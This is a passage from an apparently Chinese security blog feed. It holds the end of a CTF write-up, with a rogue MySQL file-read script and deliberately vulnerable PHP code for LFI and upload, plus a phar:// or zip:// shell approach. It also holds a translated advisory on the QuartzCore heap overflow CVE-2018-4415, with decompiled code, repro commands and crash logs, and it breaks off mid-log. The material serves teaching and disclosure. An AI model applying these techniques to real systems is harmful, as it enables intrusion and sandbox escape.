          tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line"><span class="comment"># daemonize()</span></span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure></p>
<p>执行<code>select * from users;</code>即可读取到flag。</p>
<p>参考<a href="https://juejin.im/entry/5c8b65c9f265da2d853324d4" target="_blank" rel="noopener">从一道ctf题学习mysql任意文件读取漏洞</a></p>
<h2 id="0x03-Web-RefSpace"><a href="#0x03-Web-RefSpace" class="headerlink" title="0x03 Web - RefSpace"></a>0x03 Web - RefSpace</h2><p>打开题目url，发现其url经过跳转变为<code>http://target_url/?route=app/index</code>，查看源码发现其开启了错误回显。可以利用<code>route</code>参数结合伪协议读取源码。首先读取<code>index.php</code>和<code>app/index.php</code>，得知存在<code>app/flag.php</code>，在<code>app/flag.php</code>得知<code>backup.zip</code>的存在。通过检查<code>robots.txt</code>文件得知<code>app/Up10aD.php</code>文件的存在。最后得知存在目录<code>/upload/</code>。</p>
<p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">define(<span class="string">'LFI'</span>, <span class="string">'LFI'</span>);</span><br><span class="line">$lfi = $_GET[<span class="string">'route'</span>] ?? <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!$lfi) &#123;</span><br><span class="line">    header(<span class="string">"location: ?route=app/index"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"&#123;$lfi&#125;.php"</span>;</span><br><span class="line"><span class="comment">//Good job, you know how to use LFI, don't you?</span></span><br><span class="line"><span class="comment">//But You are still far from flag</span></span><br><span class="line"><span class="comment">//hint: ?router=app/flag</span></span><br></pre></td></tr></table></figure></p>
<p><strong>app/index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'LFI'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Include me!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    Hi CTFer,&lt;br /&gt;</span><br><span class="line">    è¿æ¯ä¸ä¸ªéå¸¸éå¸¸ç®åçSDKæå¡ï¼å®çä»»å¡æ¯ç»åä½å¤§ä½¬&lt;!--é¼ --&gt;æä¾flag&lt;br /&gt;</span><br><span class="line">    Powered by Aoisystem&lt;br /&gt;</span><br><span class="line">    &lt;!-- error_reporting(E_ALL); --&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>app/flag.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">    echo &quot;Include me!&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$key = $_GET[&apos;key&apos;] ?? false;</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &quot;Please provide access key&lt;br \&gt;&quot;;</span><br><span class="line">    echo &apos;$_GET[&quot;key&quot;];&apos;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$flag = $sdk-&gt;verify($key);</span><br><span class="line">if ($flag) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Wrong Key&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">//Do you want to know more about this SDK?</span><br><span class="line">//we &apos;accidentally&apos; save a backup.zip for more information</span><br></pre></td></tr></table></figure></p>
<p><strong>app/Up10aD.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">    echo &quot;Include me!&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_FILES[&quot;file&quot;])) &#123;</span><br><span class="line">    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $fileext = &quot;.gif&quot;;</span><br><span class="line">    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;</span><br><span class="line">        case &apos;image/gif&apos;:</span><br><span class="line">            $fileext = &quot;.gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;image/jpeg&apos;:</span><br><span class="line">            $fileext = &quot;.jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            echo &quot;Only gif/jpg allowed&quot;;</span><br><span class="line">            exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $dst = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . $fileext;</span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);</span><br><span class="line">    echo &quot;æä»¶ä¿å­ä½ç½®: &#123;$dst&#125;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    æä»¬ä¸è½è®©éæè½»èæä¸¾çæç´¢å°ä¸ä¼ æ¥å£ã&lt;br /&gt;</span><br><span class="line">    å³ä¾¿æ¯è¿æ°å¥½çäººç¢°å·§éå°äºï¼æç¸ä¿¡æä»¬çè¿æ»¤æ¯ä¸æ ä¸å¤±ç(ææª</span><br><span class="line">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;æ¥éæ©ä½ çæä»¶å§:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>backup.zip</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">我们的SDK通过如下SHA1算法验证key是否正确:</span><br><span class="line"></span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line">    if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">        return &quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果正确的话，我们的SDK会返回flag。</span><br><span class="line"></span><br><span class="line">PS: 为了节省各位大佬的时间，特注明</span><br><span class="line">    1.此处函数return值并不是真正的flag，和真正的flag没有关系。</span><br><span class="line">    2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php)</span><br><span class="line">    3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。</span><br><span class="line">    4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。</span><br></pre></td></tr></table></figure></p>
<p><code>flag.php</code>中接受一个<code>key</code>参数作为变量<code>$key</code>的值，并作为参数传入<code>$sdk-&gt;verify()</code>中，在<code>backup.zip</code>中的内容可以看出，<code>$key</code>的值经过SHA1处理后与<code>$sdk-&gt;getHash()</code>比较，若一致则返回内容。<br><code>Up10aD.php</code>则是一个文件上传脚本，接收<code>gif</code>和<code>jpg</code>类型的文件，并拼接相应后缀后保存在<code>upload</code>目录中。<br>这里可以通过上传zip文件，以<code>zip://</code>或者<code>phar://</code>伪协议的方法进行包含getshell。</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
            <category> 赛后总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 赛后总结 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通过QuartzCore堆溢出实现Safari沙箱逃逸]]></title>
      <url>/blog/public/2018/12/03/%E9%80%9A%E8%BF%87QuartzCore%E5%A0%86%E6%BA%A2%E5%87%BA%E5%AE%9E%E7%8E%B0Safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8</url>
      <content type="html"><![CDATA[<blockquote>
<p>转自<a href="https://blogs.securiteam.com/index.php/archives/3796" target="_blank" rel="noopener">SSD Advisory – iOS/macOS Safari Sandbox Escape via QuartzCore Heap Overflow</a></p>
</blockquote>
<h1 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要"></a>漏洞摘要</h1><p><a href="https://developer.apple.com/documentation/quartzcore" target="_blank" rel="noopener">QuratzCore</a>，或者称之为<code>CoreAnimation</code>，是macOS和iOS用来创建动画图表的框架。<code>CoreAnimation</code>使用了一个独特的渲染模型，这个渲染模型的图像操作运行在一个独立的进程中。在macOS中，这个独立的进程是<code>WindowServer</code>，在iOS中，这个独立的进程是<code>backboardd</code>，他们都不在沙箱内，并且有权限执行<code>setuid</code>命令。作为服务，<code>QuartzCore</code>常被称作<code>CARenderServer</code>。它存在于macOS和iOS上，并且可以在Safari沙箱内被获取到，因此，他曾在多种场景下被用在<code>Pwn2Own</code>上。在最新版本macOS和iOS上的<code>QuartzCore</code>中存在着会导致<em>堆溢出</em>的<em>整型溢出漏洞</em>。</p>
<h1 id="厂商回应"><a href="#厂商回应" class="headerlink" title="厂商回应"></a>厂商回应</h1><p>“CoreAnimation Impact: An application may be able to execute arbitrary code with system privileges<br>Description: A memory corruption issue was addressed with improved memory handling.<br>CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure”</p>
<blockquote>
<p>CoreAnimation影响：应用有可能以系统权限执行任意代码。<br>描述：内存崩溃的问题通过改进的内存处理被解决。<br>CVE-2018-4415: Beyond Security’s SecuriTeam Secure Disclosure</p>
</blockquote>
<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p><strong>CVE-2018-4415</strong></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>将本漏洞报告给<code>Beyond Security’s SecuriTeam Secure Disclosure</code>项目的一位独立的安全研究员。</p>
<h1 id="影响系统"><a href="#影响系统" class="headerlink" title="影响系统"></a>影响系统</h1><p>macOS 10.14<br>iOS 12.10</p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>漏洞产生的根本在于<code>QuartzCore</code>的<code>CA::Render::InterpolatedFunction::InterpolatedFunction</code>函数，这个函数没有考虑到整型溢出的情况。在接下来的内容中我们将讨论一下macOS和iOS上本漏洞的一些细节。</p>
<h2 id="macOS-10-14"><a href="#macOS-10-14" class="headerlink" title="macOS 10.14"></a>macOS 10.14</h2><p>在macOS上有一个追踪<code>CARenderService</code>非常好用的API，名为<code>CGSCreateLayerContext</code>（iOS上没有该API）。攻击者可以发送id为<code>0x9C42</code>或者<code>0x9C43</code>的消息给服务端口。当进程（事实上是server_thread)接收到这份特定id的消息时，它会进入到一种类似于反序列化的程序。如果提供了合适的数据，执行流会进入到函数<code>CA::Render::InterpolatedFunction::InterpolatedFunction</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall CA::Render::InterpolatedFunction::InterpolatedFunction(CA::Render::InterpolatedFunction *<span class="keyword">this</span>, CA::Render::Decoder *a2)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line">    ++dword_2911E8;</span><br><span class="line">    v2 = a2;</span><br><span class="line">    *(_QWORD *)<span class="keyword">this</span> = off_2652D8;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = CA::Render::Decoder::<span class="keyword">decode_size_t</span>(a2); <span class="comment">// &lt;----- (b)</span></span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = CA::Render::Decoder::decode_int32(a2); <span class="comment">// &lt;----- (a)</span></span><br><span class="line">    v3 = *((_QWORD *)<span class="keyword">this</span> +<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        v5 = (*((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &gt;&gt; <span class="number">1</span>) | *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">1L</span>L;</span><br><span class="line">        v4 = (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        v4 = (<span class="keyword">float</span>)(<span class="keyword">signed</span> <span class="keyword">int</span>)v3;</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="keyword">float</span> *)<span class="keyword">this</span> +<span class="number">7</span>) = v4 + <span class="number">-1.0</span>;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0L</span>L;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)CA::Render::Decoder::decode_int32(a2) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)<span class="keyword">this</span> +<span class="number">2</span>, result); <span class="comment">// &lt;----- (c)</span></span><br><span class="line">    v7 = *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 ) &#123;</span><br><span class="line">        CA::Render:InterpolatedFunction::allocate_storage(<span class="keyword">this</span>, (<span class="keyword">char</span> *)result, v7);</span><br><span class="line">        v8 = (<span class="keyword">void</span> *)*((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v8 ) &#123;</span><br><span class="line">            CA::Render::Decoder::decode_bytes(v2, v8, <span class="number">4</span> * *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) * *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)<span class="keyword">this</span> + <span class="number">6</span>)); <span class="comment">// &lt;----- (f)</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到在(a)和(b)两个位置，他们俩的值可以被攻击者控制（CA使用类似<code>CA::Render::Decoder::decode*</code> 的函数去反序列化对象），并且在<code>CA::Render::InterpolatedFunction::allocate_storage</code>函数中，这些值将被用于决定分配内存的大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__usercall CA::Render::InterpolatedFunction::allocate_storage@&lt;rax&gt;(CA::Render::InterpolatedFunction *<span class="keyword">this</span>@&lt;rdi&gt;, <span class="keyword">char</span> *result@&lt;rax&gt;, __int64 a3@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// r14</span></span><br><span class="line">    __int64 v4; <span class="comment">// t15</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = a3 * *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)<span class="keyword">this</span> + <span class="number">6</span>); <span class="comment">// &lt;----- (d)</span></span><br><span class="line">            v4 = <span class="number">0L</span>L;</span><br><span class="line">            <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">0x20000</span> )</span><br><span class="line">                v4 = a3; <span class="comment">// &lt;----- (e)</span></span><br><span class="line">            result = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * (v4 + v3));</span><br><span class="line">            *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = result;</span><br><span class="line">            <span class="keyword">if</span> ( v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                result += <span class="number">4</span> * v3;</span><br><span class="line">                *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) = result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>) &amp; <span class="number">0x40000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">32L</span>L * *((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>));</span><br><span class="line">                *((_QWORD *)<span class="keyword">this</span> + <span class="number">6</span>) = result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在(d)处，<code>v3</code>可以被(a)和(b)处的值控制。由此(e)处的<code>v4</code>同样可以被攻击者控制。所以将要被分配的内存大小是<code>4 * (v4 + v3)</code>。但是仔细观察(f)处发现，传递给<code>CA::Render::Decoder::decode_bytes</code>的第三个参数实际为<code>4 * v3</code>。(f)处<code>CA::Render::Decoder::decode_bytes</code>最简单的形式类似<code>memcpy(v2, v8, 4 * v3)</code>或者<code>memset(v2, 0, 4 * v3)</code>。所以整型溢出导致的堆溢出发生在<code>4 * (v4 + v3)</code>溢出但<code>4 * v3</code>不溢出的时候。那些能够导致合适整型溢出的攻击者控制的值证据集均可在文末提供的漏洞利用中发现。</p>
<p>在macOS上复现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang QuartzCoreFunctionIntOverFlow.c -o quartz_core_function_over_flow -framework CoreGraphics</span><br><span class="line">./quartz_core_function_over_flow</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1 Thread 0 Crashed:: Dispatch queue: com.apple.main−thread</span><br><span class="line">com.apple.CoreFoundation 0x00007fff332e2daf __CFBasicHashAddValue + 2077</span><br><span class="line">com.apple.CoreFoundation 0x00007fff332e33f5 CFDictionarySetValue + 187</span><br><span class="line">com.apple.SkyLight 0x00007fff595ebfa9 CGXPostPortNotification + 123</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb947 notify_handler + 73</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb2d9 post_port_data + 237</span><br><span class="line">com.apple.SkyLight 0x00007fff595eafba run_one_server_pass + 949</span><br><span class="line">com.apple.SkyLight 0x00007fff595eab90 CGXRunOneServicesPass + 460</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb820 server_loop + 96</span><br><span class="line">com.apple.SkyLight 0x00007fff595eb7b5 SLXServer + 1153</span><br><span class="line">WindowServer 0x000000010011d4c4 0x10011c000 + 5316</span><br><span class="line">libdyld.dylib 0x00007fff6036ced5 start + 1</span><br><span class="line">Thread 2:: com.apple.coreanimation.render−server // CARenderServer thread</span><br><span class="line">libsystem_platform.dylib 0x00007fff6056ce09 _platform_bzero$VARIANT$Haswell</span><br><span class="line">+ 41</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8ebaa4 CA::Render::Decoder::</span><br><span class="line">decode_bytes(void*, unsigned long) + 46</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8c35f7 CA::Render::InterpolatedFunction</span><br><span class="line">::InterpolatedFunction(CA::Render::Decoder*) + 191</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8c3524 CA::Render::Function::decode(CA</span><br><span class="line">::Render::Decoder*) + 224</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8ecb8a CA::Render::Decoder::</span><br><span class="line">decode_object(CA::Render::Type) + 946</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e8edc8e CA::Render::decode_commands(CA::</span><br><span class="line">Render::Decoder*) + 871</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e896422 CA::Render::Server::</span><br><span class="line">ReceivedMessage::run_command_stream() + 748</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e73d2e1 CA::Render::Server::</span><br><span class="line">server_thread(void*) + 1841</span><br><span class="line">com.apple.QuartzCore 0x00007fff3e91427c thread_fun(void*) + 25</span><br><span class="line">libsystem_pthread.dylib 0x00007fff60572795 _pthread_body + 159</span><br><span class="line">libsystem_pthread.dylib 0x00007fff605726e2 _pthread_start + 70</span><br><span class="line">libsystem_pthread.dylib 0x00007fff605722a9 thread_start + 13</span><br></pre></td></tr></table></figure>
<h2 id="iOS-12-10"><a href="#iOS-12-10" class="headerlink" title="iOS 12.10"></a>iOS 12.10</h2><p>因为本问题产生的原因十分明显，并且macOS和iOS的代码基本上一样，在本部分中，我们只讨论iOS与MacOS不同的地方。</p>
<p>· macOS上并没有像<code>CGSCreateLayerContext</code>一样能够直接获取<code>CoreAnimation</code>渲染上下文的API，但是在探索中，我们发现<code>MIG</code>函数<code>_XRegisterClient</code>可以被用来代替<code>CGSCreateLayerContext</code>。首先，攻击者应该打开<code>com.apple.CARenderServer</code>服务（可以在沙箱内获取），然后通过ID为<code>40202</code>的<code>mach_msg</code>调用<code>_XRegisterClient</code>。<br>· 为了在<code>iOS 12 beta</code>中复现本漏洞，你应该使用最新的<code>1Xcode-beta</code>（为了最新的SDK）。<br>· 你应该根据www.malhal.com引入IOKit框架头。注意，目的目录应该更改为你的Xcode-beta应用。<br>· 代码应该放在<code>application didFinishLaunchingWithOptions</code>函数中，这样当程序运行时就会触发执行。<br>· 当程序被安装好之后，启动<code>applicationios-sbe</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1 Thread 3 name: com.apple.coreanimation.render−server // CARenderServer thread</span><br><span class="line">2 Thread 3:</span><br><span class="line">0 libsystem_platform.dylib 0x000000018fefe584 0x18fef6000 + 34180</span><br><span class="line">1 QuartzCore 0x0000000194a6e1d4 0x19491e000 + 1376724</span><br><span class="line">2 QuartzCore 0x0000000194a21a58 0x19491e000 + 1063512</span><br><span class="line">3 QuartzCore 0x0000000194a710b8 0x19491e000 + 1388728</span><br><span class="line">4 QuartzCore 0x0000000194a719c0 0x19491e000 + 1391040</span><br><span class="line">5 QuartzCore 0x00000001949fb140 0x19491e000 + 905536</span><br><span class="line">6 QuartzCore 0x00000001949facdc 0x19491e000 + 904412</span><br><span class="line">7 QuartzCore 0x0000000194ab65c8 0x19491e000 + 1672648</span><br><span class="line">8 libsystem_pthread.dylib 